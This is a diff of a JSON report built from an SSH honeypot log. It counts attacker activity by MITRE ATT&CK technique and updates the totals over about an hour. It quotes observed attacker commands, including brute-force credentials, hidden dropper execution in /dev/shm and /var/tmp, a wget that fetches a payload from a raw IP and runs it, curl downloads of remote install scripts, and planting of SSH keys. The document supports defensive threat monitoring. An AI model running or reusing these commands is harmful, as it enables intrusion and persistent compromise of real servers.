@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-24 09:03:46",
+  "generated": "2026-09-24 10:02:39",
   "totals": {
-    "commands": 4332,
-    "login_failed": 3004,
-    "login_success": 1093,
-    "sessions": 3335
+    "commands": 4463,
+    "login_failed": 3693,
+    "login_success": 1107,
+    "sessions": 4045
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3004,
+      "count": 3693,
       "examples": [
         "suser / 123456",
         "antonio / antonio",
@@ -21,14 +21,14 @@
         "root / Pass2024"
       ],
       "first": "2026-09-24T00:00:32.122319Z",
-      "last": "2026-09-24T09:03:41.769449Z",
-      "unique_ips": 73
+      "last": "2026-09-24T10:02:38.965627Z",
+      "unique_ips": 83
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1093,
+      "count": 1107,
       "examples": [
         "root / root",
         "root / mk@123456",
@@ -37,28 +37,28 @@
         "user / user"
       ],
       "first": "2026-09-24T00:04:51.269971Z",
-      "last": "2026-09-24T09:02:14.466599Z",
-      "unique_ips": 57
+      "last": "2026-09-24T10:00:25.159155Z",
+      "unique_ips": 65
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 944,
+      "count": 945,
       "examples": [
         "ls -lh $(which ls)",
         "ls /home; /bin/busybox BOTNET",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-09-24T00:16:08.185425Z",
-      "last": "2026-09-24T06:47:33.194616Z",
-      "unique_ips": 7
+      "last": "2026-09-24T09:22:41.589018Z",
+      "unique_ips": 8
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 614,
+      "count": 664,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -67,14 +67,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-24T00:04:54.092424Z",
-      "last": "2026-09-24T09:02:16.766930Z",
-      "unique_ips": 33
+      "last": "2026-09-24T10:00:27.360195Z",
+      "unique_ips": 37
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 62,
+      "count": 72,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -83,14 +83,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-24T00:16:03.897652Z",
-      "last": "2026-09-24T07:58:53.717935Z",
-      "unique_ips": 16
+      "last": "2026-09-24T09:22:48.362352Z",
+      "unique_ips": 18
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 39,
+      "count": 40,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -99,14 +99,14 @@
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
       ],
       "first": "2026-09-24T00:15:58.081526Z",
-      "last": "2026-09-24T07:58:53.820298Z",
-      "unique_ips": 14
+      "last": "2026-09-24T09:22:35.357899Z",
+      "unique_ips": 15
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 16,
+      "count": 18,
       "examples": [
         "w",
         "whoami",
@@ -115,14 +115,14 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-24T00:16:09.607300Z",
-      "last": "2026-09-24T06:48:18.284542Z",
-      "unique_ips": 11
+      "last": "2026-09-24T09:22:46.985582Z",
+      "unique_ips": 12
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 12,
+      "count": 14,
       "examples": [
         "crontab -l",
         "top",
@@ -130,21 +130,21 @@
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-09-24T00:16:08.904262Z",
-      "last": "2026-09-24T06:47:37.088077Z",
-      "unique_ips": 6
+      "last": "2026-09-24T09:22:45.159091Z",
+      "unique_ips": 7
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 8,
+      "count": 9,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-09-24T00:15:57.120124Z",
-      "last": "2026-09-24T06:47:21.736544Z",
-      "unique_ips": 8
+      "last": "2026-09-24T09:22:35.245342Z",
+      "unique_ips": 9
     },
     {
       "id": "T1070.004",
@@ -211,31 +211,35 @@
   "unmapped": [
     [
       "sh",
-      1042
+      1050
     ],
     [
       "system",
-      1042
+      1050
     ],
     [
       "/bin/busybox HISILICON",
-      145
+      157
     ],
     [
       "shell",
-      104
+      112
     ],
     [
       "enable",
-      100
+      109
     ],
     [
       "ping; sh",
-      97
+      105
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      49
+      53
+    ],
+    [
+      "root",
+      10
     ],
     [
       "zalee",
@@ -254,23 +258,23 @@
       8
     ],
     [
-      "root",
-      8
-    ],
-    [
       "/bin/busybox UNSTABLE",
       4
     ],
     [
+      "/bin/busybox",
+      4
+    ],
+    [
       "admin",
+      4
+    ],
+    [
+      "cd /proc && cat self/cmdline",
       3
     ],
     [
       "linuxshell",
-      2
-    ],
-    [
-      "/bin/busybox",
       2
     ],
     [
@@ -283,10 +287,6 @@
     ],
     [
       "python3 /tmp/bendi.py",
-      1
-    ],
-    [
-      "rm /tmp/bendi.py",
       1
     ]
   ]
